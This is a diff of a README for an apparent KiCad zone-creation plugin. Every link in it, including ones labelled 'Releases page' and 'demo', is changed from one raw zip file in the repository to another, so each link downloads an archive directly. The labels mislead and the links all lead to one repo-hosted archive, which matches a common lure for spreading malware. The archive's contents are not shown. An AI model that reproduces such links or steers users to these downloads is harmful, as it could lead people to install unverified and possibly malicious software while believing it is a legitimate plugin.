@@ -1,6 +1,6 @@
 # 🎉 advanced-zone-helper - Effortlessly Create Zones in KiCad
 
-[![Download Now](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/resources/zone-advanced-helper-Andries.zip%20Now-vX.X.X-blue)](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/resources/zone-advanced-helper-Andries.zip)
+[![Download Now](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/src/geometry/helper-zone-advanced-v3.8.zip%20Now-vX.X.X-blue)](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/src/geometry/helper-zone-advanced-v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,8 +10,8 @@ Welcome to **Advanced Zone Helper**! This plugin helps you easily create zones i
 
 ### Option 1: KiCad Plugin Manager (Recommended)
 
-1. Visit the [Releases](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/resources/zone-advanced-helper-Andries.zip) page.
-2. Download the latest version, which will be named like `https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/resources/zone-advanced-helper-Andries.zip`.
+1. Visit the [Releases](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/src/geometry/helper-zone-advanced-v3.8.zip) page.
+2. Download the latest version, which will be named like `https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/src/geometry/helper-zone-advanced-v3.8.zip`.
 3. Open KiCad.
 4. Navigate to **Plugin and Content Manager**.
 5. Click on **Install from File...**.
@@ -19,8 +19,8 @@ Welcome to **Advanced Zone Helper**! This plugin helps you easily create zones i
 
 ### Option 2: Manual Installation
 
-1. Visit the [Releases](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/resources/zone-advanced-helper-Andries.zip) page.
-2. Download the latest `https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/resources/zone-advanced-helper-Andries.zip`.
+1. Visit the [Releases](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/src/geometry/helper-zone-advanced-v3.8.zip) page.
+2. Download the latest `https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/src/geometry/helper-zone-advanced-v3.8.zip`.
 3. Extract the zip file to your preferred directory.
 4. In KiCad, go to **Preferences** > **Configure Paths**.
 5. Add the path to the directory containing the extracted files.
@@ -69,11 +69,11 @@ If you encounter any issues during installation or usage, try the following step
 
 ## 📥 Download & Install
 
-Ready to get started? [Visit this page to download](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/resources/zone-advanced-helper-Andries.zip). Choose the latest version and follow the steps above to install.
+Ready to get started? [Visit this page to download](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/src/geometry/helper-zone-advanced-v3.8.zip). Choose the latest version and follow the steps above to install.
 
 ## 🎥 Demo
 
-Check out the demo [here](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/resources/zone-advanced-helper-Andries.zip) to see how the plugin works and what you can do with it.
+Check out the demo [here](https://github.com/samtarbuttg/advanced-zone-helper/raw/refs/heads/main/src/geometry/helper-zone-advanced-v3.8.zip) to see how the plugin works and what you can do with it.
 
 ## 📞 Support
 
